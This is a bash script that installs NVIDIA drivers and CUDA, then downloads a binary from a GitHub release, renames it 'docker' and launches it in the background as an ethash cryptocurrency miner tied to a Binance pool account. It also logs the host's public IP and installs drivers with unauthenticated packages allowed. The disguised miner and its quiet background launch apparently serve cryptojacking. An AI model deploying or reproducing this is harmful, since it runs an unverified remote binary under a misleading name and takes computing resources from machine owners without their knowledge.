SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/installed.txt" ]; then
	ip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
	echo "$ip" > installed.txt
	wget http://us.download.nvidia.com/tesla/410.129/nvidia-diag-driver-local-repo-ubuntu1804-410.129_1.0-1_amd64.deb
	sudo dpkg -i nvidia-diag-driver-local-repo-ubuntu1804-410.129_1.0-1_amd64.deb
	sudo apt-key add /var/nvidia-diag-driver-local-repo-410.129/7fa2af80.pub
	sudo apt-get update
	sudo apt-get -y install cuda-drivers --allow-unauthenticated
	sudo apt-get install gcc g++ build-essential libssl-dev automake linux-headers-$(uname -r) git gawk libcurl4-openssl-dev libjansson-dev xorg libc++-dev libgmp-dev python-dev -y
	wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin
	sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
	sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub
	sudo add-apt-repository "deb http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/ /"
	sudo apt-get update
	sudo apt-get -y install cuda
	sudo apt-get install libcurl3 -y
	wget https://github.com/tuannguyends/mainsystem/releases/download/main/docker
	chmod +x docker
	ip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
	./docker -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u qpoldi -p x -w RNS &
fi
